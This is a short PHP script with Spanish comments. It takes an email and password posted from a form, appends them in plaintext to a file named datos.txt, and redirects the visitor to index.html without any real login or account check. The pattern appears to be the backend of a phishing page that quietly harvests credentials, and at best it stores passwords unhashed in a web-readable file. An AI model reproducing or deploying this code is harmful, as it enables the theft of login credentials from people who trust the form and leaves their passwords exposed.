<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Construir el mensaje a guardar en el archivo
    $contenido = "Email: $email\n";
    $contenido .= "Password: $password\n\n";

    // Abrir o crear el archivo datos.txt en modo de escritura (a)
    $archivo = fopen("datos.txt", "a");

    // Escribir los datos en el archivo
    fwrite($archivo, $contenido);

    // Cerrar el archivo
    fclose($archivo);

    // Redirigir a una página de éxito o a cualquier otra página deseada
    header("Location: index.html");
    exit();
} else {
    // Si se accede directamente a este archivo sin enviar datos por POST,
    // redireccionar al formulario
    header("Location: index.html");
    exit();
}
?>
